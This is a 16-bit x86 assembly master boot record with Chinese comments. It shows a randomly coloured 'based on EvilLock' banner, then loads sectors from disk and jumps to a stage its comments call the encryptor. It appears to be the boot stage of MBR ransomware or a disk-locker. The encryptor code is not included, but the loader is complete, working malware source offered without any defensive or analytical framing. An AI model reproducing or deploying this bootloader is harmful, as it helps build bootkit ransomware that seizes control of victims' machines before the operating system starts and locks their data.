bits 16 ; 16位程序
org 0x7C00 ; 指定编译器从0x7C00开始编址

xor ax, ax
mov ds, ax
mov es, ax
mov fs, ax
mov gs, ax
mov ss, ax ; 初始化需要用到的寄存器

mov esp, 0x7C00
mov ebp, esp ; 设置栈底指针指向引导程序
main:
	xor ah, ah   ; 设置显示模式(AL显示模式)
	mov al, 0x13 ; 320x200,256色
	int 0x10 ; 引发10H中断过程

	rdtsc ; 将处理器的时间标签计数器的当前值加载到EDX:EAX
	mov word [seed], ax ; 将种子设置为时间戳计数器
	call text_loop
	call ClearScreen
    jmp loadingEncryptor
	;jmp _REST
; AX = Return value, BX = Seed
xorshift16:
	mov ax, bx ; 将种子载入AX
	shl ax, 7  ; AX左移7位
	xor bx, ax ; BX与AX进行异或，结果保存于BX
	mov ax, bx ; 将BX的值载入AX
	shr ax, 9  ; AX右移9位
	xor bx, ax ; BX与AX进行异或，结果保存于BX
	mov ax, bx ; 将BX的值载入AX
	shl ax, 8  ; AX左移8位
	xor bx, ax ; BX与AX进行异或，结果保存于BX
	mov ax, bx ; 将BX的值载入AX
	ret        ; IP出栈，返回char_loop

text_loop:
	mov ah, 0x02 ; 设置光标位置(BH页码，DH行，DL列)
	xor bh, bh   ; 设置页码为0
	xor dl, dl   ; 设置列为0
	int 0x10     ; 引发10H中断过程
	
	mov si, string ; 将字符串载入SI中
.char_loop:
	lodsb             ; 从ESI指向的源地址中逐一读取一个字符,送入AL中
	or al, al         ; 测试AL是否为0
	jz .char_loop_end ; AL为0则跳转至char_loop_end

	push ax             ; 将AX送入栈内
	mov bx, word [seed] ; 将种子载入BX中
	call xorshift16     ; IP入栈，跳转至xorshift16
	xor word [seed], ax ; 种子与AX进行异或，结果保存于种子(相当于刷新种子)
	mov bl, al          ; 将AL的值载入BL
	pop ax              ; AX出栈

	mov ah, 0x0E   ; 在Teletype模式下显示字符(AL字符，BH页码，BL前景色)
	int 0x10       ; 引发10H中断过程
	jmp .char_loop ; 跳转至char_loop
.char_loop_end:
	nop ;延迟
	nop ;延迟
	inc dh        ; DH内的值加1
	jz .end       ; 若DH的值为0则跳转至end
	cmp dh, 100    ; 比较DH的值与100 就是执行100次 主要是懒得再写延时了,加上前面的nop大概300次执行的延迟
    jne text_loop ; 若不相等，则跳转至text_loop
    je loadingEncryptor;相等就给爷加载到Encryptor
.end:
	ret
loadingEncryptor:              ; 函数 'loadingEncryptor'
    mov bx, 0x1000         ; 设置内存地址 [段] 用于读取硬盘扇区到该内存段
    mov es, bx             ; 将该扇区移至 ES 寄存器 [ES 段寄存器]
    mov bx, 0              ; 将偏移量移至 BX 寄存器 | 因此，该函数会读取硬盘并将读取的字节码上传到 RAM 地址：0x1000:0x0000
    
    mov ah, 0x02           ; 设置函数 '读取' 的 13h 中断 | AH = 0x02 - 读取, AH = 0x03 - 写入
    mov al, 2              ; 设置 '读取多少扇区'
    mov dh, 0              ; 设置硬盘磁头
    mov ch, 0              ; 设置硬盘柱面
    mov cl, 4              ; 设置起始读取指针 | SetFilePointer(硬盘的第三个扇区);
    int 0x13               ; 使用 13h 中断
    jc loadingEncryptor    ; 如果出错 - 重新读取
                           ; 否则...
    mov ax, 0x1000         ; 将新的内存段 [RAM 地址] 移至 AX
    mov ds, ax             ; 将该段移至 DS 段寄存器 | 设置 DS = 0x1000
    mov es, ax             ; 将该段移至 ES 段寄存器 | 设置 ES = 0x1000
    mov fs, ax             ; 将该段移至 FS 段寄存器 | 设置 FS = 0x1000
    mov gs, ax             ; 将该段移至 GS 段寄存器 | 设置 GS = 0x1000
    mov ss, ax             ; 将该段移至 SS 段寄存器 | 设置 SS = 0x1000

    jmp 0x1000:0           ; 跳转到加密器的内存地址 [段:偏移]
; 清屏
ClearScreen:
    mov ah, 07h                 ; 调用的中断功能
    mov al, 0h                  ; 滚动整个窗口
    mov cx, 0h                  ; 行 0，列 0
    mov dx, 184fh
    int 10h
    ret
seed:
	dw 4096
string:
	db 'This program is based on EvilLock', 0x00 ; 显示的字符串

times 510 - ($ - $$) db 0
dw 0xAA55 ; MBR有效标志
